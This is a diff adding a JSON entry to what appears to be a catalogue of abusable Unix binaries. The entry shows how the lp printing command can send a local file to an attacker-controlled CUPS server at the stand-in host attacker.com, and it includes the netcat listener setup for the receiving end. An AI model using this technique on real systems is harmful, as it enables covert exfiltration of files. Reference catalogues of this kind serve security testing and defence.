@@ -1,0 +1,10 @@
+{
+  "functions": {
+    "file-upload": [
+      {
+        "description": "To collect the file run the following on the attacker box (this requires `cups` to be installed):\n\n1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;\n2. `lpadmin -d printer` to set the new printer as default;\n3. `cupsctl --remote-any` to enable printing from the Internet;\n4. `nc -lkp 9100` to receive the file.\n\nSend a local file to a CUPS server.\n",
+        "code": "LFILE=file_to_send\nRHOST=attacker.com\nlp $LFILE -h $RHOST\n"
+      }
+    ]
+  }
+}
